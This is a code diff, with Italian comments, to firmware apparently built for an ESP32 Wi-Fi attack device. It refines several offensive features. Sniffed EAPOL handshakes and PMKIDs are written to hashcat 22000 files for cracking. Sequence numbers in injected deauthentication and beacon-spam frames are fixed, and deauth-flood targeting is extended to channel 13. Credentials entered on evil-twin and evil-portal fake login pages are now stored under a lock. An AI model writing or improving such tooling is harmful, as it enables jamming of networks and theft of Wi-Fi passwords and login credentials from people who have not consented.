@@ -16,6 +16,7 @@
 #include "MenuManager.h"
 #include "ModuleFlags.h"
 #include "Navigation.h"
+#include "PcapTools.h"
 #include "Storage.h"
 #include "TextInput.h"
 #include "Ui.h"
@@ -378,6 +379,7 @@ void runChannelAnalyzer() {
     delay(100);
 
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_promiscuous_rx_cb(channelAnalyzerCb);
     if (esp_wifi_set_promiscuous(true) != ESP_OK) {
         WiFi.mode(WIFI_OFF);
@@ -447,6 +449,7 @@ void runChannelAnalyzer() {
     }
 
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
     WiFi.mode(WIFI_OFF);
 }
@@ -479,6 +482,7 @@ void runJamDetect() {
     wifi_promiscuous_filter_t filter = {};
     filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_promiscuous_rx_cb(jamDetectCb);
     esp_wifi_set_promiscuous_filter(&filter);
     if (esp_wifi_set_promiscuous(true) != ESP_OK) {
@@ -549,6 +553,7 @@ void runJamDetect() {
     }
 
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
     WiFi.mode(WIFI_OFF);
 }
@@ -577,6 +582,9 @@ void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t) {
     if (length < 10) {
         return;
     }
+    // sig_len comprende l'FCS (4 byte): il linktype 105 del PCAP non lo prevede,
+    // e lasciarlo dentro produce frame malformati in Wireshark.
+    length = static_cast<uint16_t>(length - 4);
     portENTER_CRITICAL_ISR(&g_sniffMux);
     const int next = (g_sniffHead + 1) % kSnifferSlots;
     if (next == g_sniffTail) {
@@ -621,6 +629,7 @@ void runSniffer() {
     delay(100);
 
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_promiscuous_rx_cb(snifferCb);
     if (esp_wifi_set_promiscuous(true) != ESP_OK) {
         WiFi.mode(WIFI_OFF);
@@ -635,10 +644,25 @@ void runSniffer() {
     g_sniffDropped = 0;
     g_sniffTotal = 0;
 
+    // Estrazione live: gli EAPOL vengono copiati dal ring e analizzati qui sul
+    // task principale, mai nel callback ISR.
+    pcaptools::LiveCollector live;
+    live.reset();
+
     storage::mkdir("/captures", true);
-    File file = storage::openWrite("/captures/wifi_capture.pcap", true);
+    // Nome univoco: FILE_WRITE tronca, quindi un nome fisso cancellerebbe la
+    // cattura precedente a ogni sessione.
+    const uint32_t captureId = esp_random();
+    char capturePath[48];
+    char hcPath[48];
+    std::snprintf(capturePath, sizeof(capturePath), "/captures/wifi_%08lX.pcap",
+                  static_cast<unsigned long>(captureId));
+    std::snprintf(hcPath, sizeof(hcPath), "/captures/wifi_%08lX.hc22000",
+                  static_cast<unsigned long>(captureId));
+    File file = storage::openWrite(capturePath, true);
     if (!file) {
         esp_wifi_set_promiscuous(false);
+        esp_wifi_set_promiscuous_rx_cb(nullptr);
         WiFi.mode(WIFI_OFF);
         ui::message("Sniffer", {"Impossibile creare il file PCAP."}, "WiFi");
         return;
@@ -665,7 +689,11 @@ void runSniffer() {
             break;
         }
 
-        while (true) {
+        // Drenaggio limitato: con la scheda SD lenta o un canale trafficato il
+        // produttore riempie l'anello piu' in fretta di quanto lo si svuoti, e
+        // senza un limite il ciclo esterno (tasti, cambio canale, disegno) non
+        // verrebbe mai raggiunto.
+        for (int drain = 0; drain < kSnifferSlots; ++drain) {
             SnifferSlot slot;
             bool have = false;
             portENTER_CRITICAL(&g_sniffMux);
@@ -679,15 +707,21 @@ void runSniffer() {
             if (!have) {
                 break;
             }
+            // Analisi leggera sul task principale: copia solo i frame utili
+            // (EAPOL, beacon/probe response) nella lista in RAM.
+            live.feed(slot.data, slot.length);
             PcapPacketHeader header = {};
             const uint32_t now = millis();
             header.tsSec = now / 1000;
             header.tsUsec = (now % 1000) * 1000;
             header.inclLen = slot.length;
             header.origLen = slot.length;
-            file.write(reinterpret_cast<const uint8_t*>(&header),
-                       sizeof(header));
-            file.write(slot.data, slot.length);
+            if (file.write(reinterpret_cast<const uint8_t*>(&header),
+                           sizeof(header)) != sizeof(header) ||
+                file.write(slot.data, slot.length) != slot.length) {
+                logger::warn("Sniffer: scrittura PCAP fallita (SD piena?)");
+                break;
+            }
             ++written;
         }
 
@@ -698,7 +732,7 @@ void runSniffer() {
         if (now - lastDraw > 200) {
             display::clear();
             display::header("Sniffer 802.11", "WiFi");
-            display::text(8, 28, "File: /captures/wifi_capture.pcap",
+            display::text(8, 28, std::string("File: ") + capturePath,
                           display::kTextDim, 0);
             display::text(8, 46,
                           "Frame: " + std::to_string(g_sniffTotal),
@@ -713,6 +747,9 @@ void runSniffer() {
                           "Canale " + std::to_string(channel) +
                               "   ` = interrompi",
                           display::kTextDim, 0);
+            display::text(8, 114,
+                          "Cand. hc22000: " + std::to_string(live.entries()),
+                          display::kTextDim, 0);
             display::push();
             lastDraw = now;
         }
@@ -722,9 +759,24 @@ void runSniffer() {
     file.flush();
     file.close();
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
     WiFi.mode(WIFI_OFF);
-    logger::info("Sniffer terminato: %u frame", static_cast<unsigned>(written));
+    logger::info("Sniffer terminato: %u frame in %s",
+                 static_cast<unsigned>(written), capturePath);
+
+    // Scrittura finale dell'hashcat 22000 con quanto raccolto in RAM.
+    // Il file viene creato anche se non ci sono hash (in tal caso e' vuoto),
+    // cosi' ogni sessione ha il suo output accanto al PCAP.
+    pcaptools::HcStats hcStats;
+    if (live.writeFile(hcPath, true, &hcStats)) {
+        logger::info("Sniffer: hc22000 %u PMKID, %u handshake, %u senza SSID in %s",
+                     static_cast<unsigned>(hcStats.pmkid),
+                     static_cast<unsigned>(hcStats.handshakes),
+                     static_cast<unsigned>(hcStats.skippedNoEssid), hcPath);
+    } else {
+        logger::warn("Sniffer: scrittura hc22000 non riuscita");
+    }
 }
 
 struct HostEntry {
@@ -1773,6 +1825,7 @@ void runDeauth() {
     uint8_t bssid[6] = {0};
     if (!parseBssid(target.bssid, bssid)) {
         esp_wifi_set_promiscuous(false);
+        esp_wifi_set_promiscuous_rx_cb(nullptr);
         WiFi.mode(WIFI_OFF);
         ui::message("Deauth", {"BSSID non valido."}, "WiFi");
         return;
@@ -1801,7 +1854,7 @@ void runDeauth() {
         }
         for (int i = 0; i < 5; ++i) {
             frame[22] = static_cast<uint8_t>(sequence & 0xFF);
-            frame[23] = static_cast<uint8_t>((sequence >> 8) & 0x0F);
+            frame[23] = static_cast<uint8_t>(((sequence >> 8) & 0x0F) << 4);
             ++sequence;
             esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
             ++packets;
@@ -1815,6 +1868,7 @@ void runDeauth() {
     }
 
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
     WiFi.mode(WIFI_OFF);
     logger::info("Deauth terminato: %u frame", static_cast<unsigned>(packets));
@@ -1941,7 +1995,7 @@ void runBeaconSpam() {
             buildBeacon(frame, mac, ssid, static_cast<uint8_t>(strlen(ssid)),
                         channel);
         frame[22] = static_cast<uint8_t>(sequence & 0xFF);
-        frame[23] = static_cast<uint8_t>((sequence >> 8) & 0x0F);
+        frame[23] = static_cast<uint8_t>(((sequence >> 8) & 0x0F) << 4);
         ++sequence;
         esp_wifi_80211_tx(WIFI_IF_STA, frame, length, false);
         ++packets;
@@ -1961,6 +2015,7 @@ void runBeaconSpam() {
     }
 
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
     WiFi.mode(WIFI_OFF);
     logger::info("Beacon spam terminato: %u frame",
@@ -2005,7 +2060,7 @@ void runDeauthFlood() {
             continue;
         }
         target.channel = static_cast<uint8_t>(
-            std::min(11, std::max(1, network.channel)));
+            std::min(13, std::max(1, network.channel)));
         targets.push_back(target);
         if (targets.size() >= 24) {
             break;
@@ -2063,7 +2118,7 @@ void runDeauthFlood() {
         };
         for (int i = 0; i < 4; ++i) {
             frame[22] = static_cast<uint8_t>(sequence & 0xFF);
-            frame[23] = static_cast<uint8_t>((sequence >> 8) & 0x0F);
+            frame[23] = static_cast<uint8_t>(((sequence >> 8) & 0x0F) << 4);
             ++sequence;
             esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
             ++packets;
@@ -2080,6 +2135,7 @@ void runDeauthFlood() {
     }
 
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
     WiFi.mode(WIFI_OFF);
     logger::info("Deauth flood terminato: %u frame su %u target",
@@ -2093,6 +2149,24 @@ struct CapturedCredential {
 };
 
 std::vector<CapturedCredential> g_credentials;
+// g_credentials e' scritto dal task del server web e letto dal task della UI:
+// senza un lock un push_back in corsa con clear() corrompe l'heap.
+SemaphoreHandle_t g_credMtx = nullptr;
+
+void credLock() {
+    if (g_credMtx == nullptr) {
+        g_credMtx = xSemaphoreCreateMutex();
+    }
+    if (g_credMtx != nullptr) {
+        xSemaphoreTake(g_credMtx, portMAX_DELAY);
+    }
+}
+
+void credUnlock() {
+    if (g_credMtx != nullptr) {
+        xSemaphoreGive(g_credMtx);
+    }
+}
 
 const char kTwinHtml[] = R"HTML(<!DOCTYPE html>
 <html lang="it"><head><meta charset="utf-8">
@@ -2184,14 +2258,17 @@ void runFakeAccessPoint(const Network& target, bool portal) {
         server.on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
             CapturedCredential credential;
             if (request->hasArg("username")) {
-                credential.username = request->arg("username").c_str();
+                // Limite di lunghezza: un client puo' inviare stringhe enormi.
+                credential.username = request->arg("username").substring(0, 63).c_str();
             }
             if (request->hasArg("password")) {
-                credential.password = request->arg("password").c_str();
+                credential.password = request->arg("password").substring(0, 63).c_str();
             }
+            credLock();
             if (!credential.username.empty() && g_credentials.size() < 20) {
                 g_credentials.push_back(credential);
             }
+            credUnlock();
             request->send(200, "text/html", kSuccessHtml);
         });
     } else {
@@ -2227,7 +2304,9 @@ void runFakeAccessPoint(const Network& target, bool portal) {
     dns.stop();
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_OFF);
+    credLock();
     g_credentials.clear();
+    credUnlock();
     logger::info("Access point di test chiuso");
 }
 
@@ -2254,7 +2333,9 @@ void runEvilTwin() {
                           "WiFi")) {
         return;
     }
+    credLock();
     g_credentials.clear();
+    credUnlock();
     runFakeAccessPoint(networks[choice], false);
 }
 
@@ -2281,7 +2362,9 @@ void runEvilPortal() {
                           "WiFi")) {
         return;
     }
+    credLock();
     g_credentials.clear();
+    credUnlock();
     runFakeAccessPoint(networks[choice], true);
 }
 
